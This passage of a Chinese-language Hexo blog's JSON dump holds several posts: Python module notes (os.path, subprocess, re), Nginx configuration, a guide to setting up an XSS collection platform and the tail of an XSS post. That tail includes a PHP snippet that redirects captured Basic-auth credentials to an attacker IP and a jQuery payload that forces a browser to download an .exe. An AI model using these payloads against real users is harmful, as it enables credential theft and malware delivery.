((isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) &amp;&amp; (isset($_SERVER[&apos;PHP_AUTH_PW&apos;])))&#123; header(&quot;Location: http://192.168.31.63/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;); &#125;?&gt; Beef框架 BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. xss蠕虫 其实是CSRF和xss的结合。利用XHR，另找时间研究学习一下。 强制软件下载 12345678910111213#!php$(document).ready(function()&#123; var server = &quot;http://server.com/&quot;; //服务器 var gate = &quot;/test/test.exe&quot;; //要下载的文件 var tabURL = window.location.href; var link = document.createElement(&apos;a&apos;); link.href = server+gate; link.download = &apos;&apos;; document.body.appendChild(link); link.click(); &#125;);","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-os-path","slug":"python/python模块-os-path","date":"2018-06-14T14:02:49.000Z","updated":"2018-08-10T13:39:02.328Z","comments":true,"path":"2018/06/14/python/python模块-os-path/","link":"","permalink":"http://yoursite.com/2018/06/14/python/python模块-os-path/","excerpt":"","text":"概述 涉及到文件和文件夹的操作的一般有三个模块 os os.path shutil os.path os.path 模块，顾名思义就是针对于系统的文件路径啊，判断是否为文件啊等等行为做出处理的模块。 os.path.abspath(path) 返回当前绝对路径+path参数的字符 123456&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)&apos;/Users/xxxx&apos;&gt;&gt;&gt; os.path.abspath(&apos;~&apos;)&apos;/Users/xxxx/~&apos;&gt;&gt;&gt; os.path.abspath(&apos;logs&apos;)&apos;/Users/xxxx/logs&apos; os.path.basename(path) 返回路径下面的文件名的字符串。(这个文件路径可能不存在) 12&gt;&gt;&gt; os.path.basename(&apos;/user/johnw/test.txt&apos;)# &apos;test.txt&apos; os.path.commonpath([path1,path2]) 接受一个序列，得到两个字符串中相同的文件路径（一定要是路径字符串） 12&gt;&gt;&gt; os.path.commonpath([&apos;/user/johnw/log.txt&apos;,&apos;/user/johnw/logs/test.txt&apos;])&apos;/user/johnw&apos; os.path.commonprefix([path1,path2]) 顾名思义，接受路径字符的序列，比较前缀 12345&gt;&gt;&gt; os.path.commonprefix([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])&apos;/usr/l&apos;&gt;&gt;&gt; os.path.commonpath([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])&apos;/usr&apos; os.path.dirname(path) 返回路径字符串中的关于文件夹的路径 12345&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/&apos;)&apos;/usr/local/src&apos;&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/test.txt&apos;)&apos;/usr/local/src&apos; os.path.exists(path) 判断文件路径是否真实存在 123456&gt;&gt;&gt; os.path.exists(&apos;/usr/local/src&apos;)False&gt;&gt;&gt; os.path.exists(&apos;/usr/local&apos;)True&gt;&gt;&gt; os.path.exists(&apos;/usr/local/sbin&apos;)True os.path.expanduser(path) 把path中包含的&quot;&quot;和&quot;user&quot;转换成用户目录 12&gt;&gt;&gt; os.path.expanduser(&apos;~&apos;)&apos;/Users/xxx&apos; os.path.expandvars(path) 根据环境变量，替换路径存在的$name 和 ${name} 的值 12&gt;&gt;&gt; os.path.expandvars(&apos;$PYENV_ROOT&apos;)&apos;/Users/xxx/.pyenv&apos; os.path.getatime(path) os.path.getmtime(path) os.path.getctime(path) 1234567891011121314文件的 Access time，atime 是在读取文件或者执行文件时更改的任何对inode的访问都会使此处改变。文件的Modified time，mtime 是在写入文件时随文件内容的更改而更改的。文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。只要stat出来的内容发生改变就会发生改变。mtime的改变必然导致ctime的改变。文件夹的 Access time，atime 是在读取文件或者执行文件时更改的（我们只cd进入一个目录然后cd ..不会引起atime的改变，但ls一下就不同了）。文件夹的 Modified time，mtime 是在文件夹中有文件的新建、删除才会改变文件夹的 Change time，ctime 基本同文件的ctime，其体现的是inode的change time。&gt;&gt;&gt; os.path.getatime(&apos;/Users/xxxx/demo.py&apos;)1524670536.2193816 os.path.getsize(path) 得到文件的大小。 以bytes为单位。如果不存在或者路径错误，返回OSError 12345[21:31:34] xxx ➜ ~» ls -hl demo.py -rw-r--r-- 1 xxxx staff 21B Apr 25 23:35 demo.py&gt;&gt;&gt; os.path.getsize(&apos;/Users/wenzhongwei/demo.py&apos;)21 os.path.isabs(path) 如果是绝对路径，返回True 12&gt;&gt;&gt; os.path.isabs(&apos;/user&apos;)True os.path.isfile(path) os.path.isdir(path) os.path.islink(path) os.path.ismount(path) 顾名思义，判断语句.会先判断这个路径字符是否真实存在，如果不存在，返回False 1234&gt;&gt;&gt; os.path.isfile(&apos;/user/text.txt&apos;)False&gt;&gt;&gt; os.path.isfile(&apos;/Users/xxx/demo.py&apos;)True os.path.join(path) 将字符拼接成合适的字符路径 12345678910&gt;&gt;&gt; os.path.join(&apos;usr&apos;,&apos;src&apos;)&apos;usr/src&apos;&gt;&gt;&gt; os.path.join(&apos;/usr&apos;,&apos;src&apos;)&apos;/usr/src&apos;&gt;&gt;&gt; os.path.join(&apos;C:&apos;,&apos;src&apos;)&apos;C:/src&apos;&gt;&gt;&gt; os.path.join(&apos;c:&apos;,&apos;src&apos;)&apos;c:/src&apos;&gt;&gt;&gt; os.path.join(&apos;test&apos;,&apos;.src&apos;)&apos;test/.src&apos; os.path.normcase(path) os.path.normpath(path) 格式化字符路径，使之符合当前系统格式 12&gt;&gt;&gt; os.path.normcase(&apos;/User/local&apos;)&apos;/User/local&apos; os.path.realpath(path) 返回字符路径的真实路径 12&gt;&gt;&gt; os.path.realpath(&apos;.&apos;)&apos;/Users/xxx&apos; os.path.relpath(path) 返回相对路径 12&gt;&gt;&gt; os.path.relpath(&apos;/Users/xxx&apos;)&apos;.&apos; os.path.samefile(path1,path2) 如果两个文件名都是指向同一个文件的话，返回True，this is determined by the device number and i-node number os.path.sameopenfile(fp1,fp2) os.path.split(path) 切割成 路径 ， 文件名 12&gt;&gt;&gt; os.path.split(&apos;/usr/local/test.txt&apos;)(&apos;/usr/local&apos;, &apos;test.txt&apos;) os.path.splitext(path) 切割成路径 ， 后缀名 12&gt;&gt;&gt; os.path.splitext(&apos;/usr/local/test.txt&apos;)(&apos;/usr/local/test&apos;, &apos;.txt&apos;) os.path.supports_unicode_filename","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"XSS平台的搭建","slug":"web_security/XSS平台的搭建","date":"2018-06-14T12:20:09.000Z","updated":"2018-08-12T10:11:28.013Z","comments":true,"path":"2018/06/14/web_security/XSS平台的搭建/","link":"","permalink":"http://yoursite.com/2018/06/14/web_security/XSS平台的搭建/","excerpt":"","text":"lnmp环境搭建 下载 123456https://lnmp.org/download.htmltar -zxvf lnmp1.5-full.tar.gz./install.sh lnmp或者./install.sh lamp XSS平台 1234567891011121314151. 下载xss平台https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip2. 数据库配置打开phpmyadmin，新建数据库 poppy将解压出来的xss.sql移动到 phpmyadmin/upload 目录下面在phpmyadmin选择导入，执行。成功导入数据库3.config.php$config[&apos;register&apos;] = &apos;normal&apos; //invite需要邀请码$config[&apos;dBPwd&apos;]=&apos;xxx&apos;$config[&apos;urlroot&apos;] = 192.168.31.xx xss_url 为404 nginx 的解决方式 通过转换.htaccess: http://www.anilcetin.com/convert-apache-htaccess-to-nginx/ 将转换后的内容写入/usr/local/nginx/config/my.conf 123456location / &#123; rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /index.php?do=code&amp;urlKey=$1 last; rewrite ^/do/auth/(w+?)(/domain/([w.]+?))?$ /; rewrite ^/register/(.*?)$ /index.php?do=register&amp;key=$1 last; rewrite ^/register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 last;&#125; apache的解决方式,新增 .htaccess 12345678&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteBase /RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L] RewriteRule ^do/auth/(w+?)(/domain/([w.]+?))?$ /index.php?do=do&amp;auth=$1&amp;domain=$3 [L] RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L] RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]&lt;/IfModule&gt; 然后修改apache的配置 1AllowOverride None ==&gt; AllowOverride All Reference https://thief.one/2017/03/15/Xss平台搭建小记/ https://zhuanlan.zhihu.com/p/27020543","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-subprocess","slug":"python/python模块-subprocess","date":"2018-06-13T00:31:54.000Z","updated":"2018-08-10T13:39:25.088Z","comments":true,"path":"2018/06/13/python/python模块-subprocess/","link":"","permalink":"http://yoursite.com/2018/06/13/python/python模块-subprocess/","excerpt":"","text":"概述 subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统的命令 代码结构及其实例 run 官方推荐其使用 run 方法。这是一个封装好的subprocess方法, 返回一个CompleteProcess 实例 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None) 代码1： 12345import subprocess# 运行后不会有输出a = subprocess.run(&apos;ls -al&apos;,shell=True,stdout=subprocess.PIPE)# 输出a.stdout 代码2： 12345678import subprocessb = subprocess.run([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)b.stdoutCompleteProcess对象有以下参数：args: 用于执行的命令，比如 ls -al, [&apos;ls&apos;,&apos;-al&apos;]returnCode: 退出进程后，返回值stdout: 命令输出stderr: 命令错误时输出 subprocess构造函数 1class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, encoding=None, errors=None) 常见代码1： 12345test = subprocess.Popen([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)# test.stdout 返回一个&lt;_io.BufferedReader name=3&gt;test.stdiyt.read() # 读取输出注： 必须要有 stdout=subprocess.PIPE 否则不会有输出。 与命令交互： 1Popen.communicate(input=None,timeout=None) # (stdout_data,stderr_data)","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块 - re","slug":"python/python模块-re","date":"2018-06-13T00:30:57.000Z","updated":"2018-08-10T13:39:13.833Z","comments":true,"path":"2018/06/13/python/python模块-re/","link":"","permalink":"http://yoursite.com/2018/06/13/python/python模块-re/","excerpt":"","text":"概述 正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。 常用的匹配规则 123456789\\w 匹配字母，数字和下划线\\d 匹配数字\\s 匹配任何空白字符\\z 匹配字符串结尾，如果有换行符，一起匹配\\n 匹配换行\\t 匹配制表符^ 匹配开头$ 匹配结尾. 匹配任何字符，除了换行符，除非指定re.DOTALL python的re模块 注： .*? 遇到换行符就不管用了，除非加上re.S match match 尝试从字符串开头开始匹配正则表达式，如果成功就返回，如果没有就返回一二None 12345678910111213&gt;&gt;&gt; import re&gt;&gt;&gt; a = &quot;Hello World&quot;&gt;&gt;&gt; b = re.match(&apos;\\w+\\s&apos;,a,re.S)&gt;&gt;&gt; b&lt;_sre.SRE_Match object; span=(0, 6), match=&apos;Hello &apos;&gt;&gt;&gt;&gt; b.span()(0, 6)&gt;&gt;&gt; b.group()&apos;Hello &apos;&gt;&gt;&gt; b.group(0)&apos;Hello &apos;None 是false search 扫描整个字符串，如果符合就返回，否则返回none 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; a = &quot;Hello World&quot;&gt;&gt;&gt; c = re.search(&apos;\\s\\w+&apos;,a)&gt;&gt;&gt; c&lt;_sre.SRE_Match object; span=(5, 11), match=&apos; World&apos;&gt;&gt;&gt;&gt; c.group()&apos; World&apos; findall 当需要提取全部匹配的内容，需要使用findall，使用search只能取回第一个。如果在匹配的时候用括号指定了，那么返回中的列表就会包含元祖 123&gt;&gt;&gt; d = re.findall(r&apos;He(l)l(o)&apos;,a)&gt;&gt;&gt; d[(&apos;l&apos;, &apos;o&apos;)] sub 替换文本,返回替换好的字符串 1re.sub(&apos;\\s\\w+&apos;,&apos;johnw&apos;,a)","categories":[{"name":"python模块","slug":"python模块","permalink":"http://yoursite.com/categories/python模块/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Linux - Nginx","slug":"linux/Linux-Nginx","date":"2018-06-09T13:22:07.000Z","updated":"2018-08-12T10:08:17.149Z","comments":true,"path":"2018/06/09/linux/Linux-Nginx/","link":"","permalink":"http://yoursite.com/2018/06/09/linux/Linux-Nginx/","excerpt":"","text":"nginx做为静态服务器和反向代理服务器 安装nginx 1234567891011121314151617181920212223# 查看nginx版本,内核需要2.6以上uname -a#安装gccyum install gcc gcc-c++ pcre-devel zlib zlib-devel openssl openssl-develgcc 编译cgcc-c++ 编译c++pcre-devel 解析perl正则zlib 用于压缩zlib-devel 用于开发openssl 用于ssl加密#安装nginx./configuremakemake install#configure配置选项--prefix=PATH 安装部署后的根目录--sbin-path 可执行文件的放置路径 基于前面的prefix &lt;prefix&gt;/sbin/nginx--conf-path 放置配置文件 &lt;prefix&gt;/conf/nginx.conf--error-log-path &lt;prefix&gt;/logs/errors.log 启动nginx 12./usr/local/sbin/nginx -s stop / reload -c xxx.conf 将nginx做为静态服务器 case: 123456server &#123; location ^~ /static&#123; alias usr/local/nginx/conf &#125;&#125; 明确root和alias的不同 1234567891011121314151617# rootlocation conf &#123; root usr/local/nginx;&#125;# aliaslocation conf &#123; alias usr/local/nginx/conf;&#125;alias 要指定到具体的一层文件夹root 会根据url来映射文件夹比如：http://www.xxx.com/conf/test.html alias的处理 匹配location为conf的规则，将配置的文件夹直接返回给用户root的处理：匹配到location为conf的规则，提取/conf/test.html 拼接到已配置的文件夹下面 将nginx做为反向代理服务器 12345678910111213# 在nginx.conf里面的http模块里面加入include &apos;/usr/local/nginx/conf/nginx2.conf&apos;vim nginx2.confupstream xxx&#123; server 112.11.11.11:8080;&#125;server&#123; server_name www.xxx.com; location / &#123; proxy_pass http://xxx; &#125;&#125; 如何做好负载均衡？ 12345upstream xxx&#123; server 111.111.111.111 weight=5(权重，优先转发); server 222.222.222.222 max_fails=3 fail_timeout=30s(失败3次，30s); server 333.333.333.333 down(下线);&#125;","categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Hello World","slug":"test/hello-world","date":"2018-06-09T06:58:25.169Z","updated":"2018-08-12T10:09:51.070Z","comments":true,"path":"2018/06/09/test/hello-world/","link":"","permalink":"http://yoursite.com/2018/06/09/test/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[{"name":"测试","slug":"测试","permalink":"http://yoursite.com/categories/测试/"}],"tags":[]}]}